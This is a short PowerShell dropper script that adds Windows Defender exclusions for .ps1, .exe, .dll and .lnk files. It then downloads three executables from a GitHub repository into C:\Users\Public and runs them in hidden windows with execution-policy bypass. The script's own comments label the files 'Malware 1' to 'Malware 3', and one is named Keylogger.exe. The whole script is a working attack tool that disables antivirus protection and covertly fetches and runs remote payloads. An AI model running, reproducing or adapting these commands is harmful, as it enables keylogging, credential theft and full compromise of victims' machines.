# Add exclusions to Windows Defender for specific file extensions
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".ps1"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".exe"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".dll"
powershell -Windowstyle Hidden Add-MpPreference -ExclusionExtension ".lnk"


#Malware 1
powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/hackyitpro/main/raw/refs/heads/main/Client.exe -o C:\Users\Public\public.exe
powershell.exe -w Hidden C:\Users\Public\public.exe

#Malware 2
powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/hackyitpro/main/raw/refs/heads/main/discord.exe -o C:\Users\Public\discord.exe
powershell.exe -w Hidden C:\Users\Public\discord.exe

#Malware 3
powershell -Windowstyle Hidden -ep bypass iwr -uri https://github.com/hackyitpro/main/raw/refs/heads/main/Keylogger.exe -o C:\Users\Public\log.exe
powershell.exe -w Hidden C:\Users\Public\log.exe



